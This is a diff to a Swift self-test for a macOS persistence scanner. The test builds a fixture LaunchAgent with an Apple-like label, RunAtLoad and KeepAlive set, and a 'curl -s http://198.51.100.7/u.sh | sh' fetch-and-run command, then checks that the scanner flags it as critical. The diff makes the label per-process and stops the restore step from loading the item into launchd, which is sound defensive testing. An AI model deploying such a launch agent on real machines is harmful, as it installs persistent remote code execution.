@@ -35,13 +35,14 @@ enum SecuritySelfTest {
         print("Background items")
         let agents = base.appendingPathComponent("LaunchAgents")
         try? fm.createDirectory(at: agents, withIntermediateDirectories: true)
-        let plist: [String: Any] = ["Label": "com.apple.updater.helper", "ProgramArguments": ["/bin/bash", "-c", "curl -s http://198.51.100.7/u.sh | sh"],
+        let fixtureLabel = "com.apple.prune-selftest-\(getpid())"
+        let plist: [String: Any] = ["Label": fixtureLabel, "ProgramArguments": ["/bin/bash", "-c", "curl -s http://198.51.100.7/u.sh | sh"],
                                     "RunAtLoad": true, "KeepAlive": true]
-        let plistURL = agents.appendingPathComponent("com.apple.updater.helper.plist")
+        let plistURL = agents.appendingPathComponent("\(fixtureLabel).plist")
         try? PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: plistURL)
         var r1 = SecurityReport()
         PersistenceAnalyzer.scan(dirs: [(agents.path, false)], report: &r1)
-        let agent = r1.findings.first { $0.title == "com.apple.updater.helper" }
+        let agent = r1.findings.first { $0.title == fixtureLabel }
         SelfTest.check("Apple-impersonating curl|sh agent is critical", agent?.severity == .critical, agent.map { $0.severity.label } ?? "missing")
         SelfTest.check("chain diagram built", (r1.chains["persist:\(plistURL.path)"]?.count ?? 0) >= 2)
 
@@ -56,10 +57,11 @@ enum SecuritySelfTest {
             if let dropEntry { _ = Quarantine.restore(dropEntry) }
             SelfTest.check("restored script is executable again", ((try? fm.attributesOfItem(atPath: base.appendingPathComponent("dropper.sh").path)[.posixPermissions]) as? NSNumber)?.intValue ?? 0 & 0o100 != 0)
             if let entry = Quarantine.load().first(where: { $0.items.contains { $0.original == plistURL.path } }) {
-                let err = Quarantine.restore(entry)
+                // The fixture contains a malicious-looking command: never load it into launchd.
+                let err = Quarantine.restore(entry, reloadLaunchItem: false)
                 SelfTest.check("restore puts it back", err == nil && FS.exists(plistURL), err ?? "")
                 // Clean up anything launchd may have been told about.
-                Shell.run("/bin/launchctl", ["bootout", "gui/\(getuid())/com.apple.updater.helper"], timeout: 5)
+                Shell.run("/bin/launchctl", ["bootout", "gui/\(getuid())/\(fixtureLabel)"], timeout: 5)
             }
         }
 
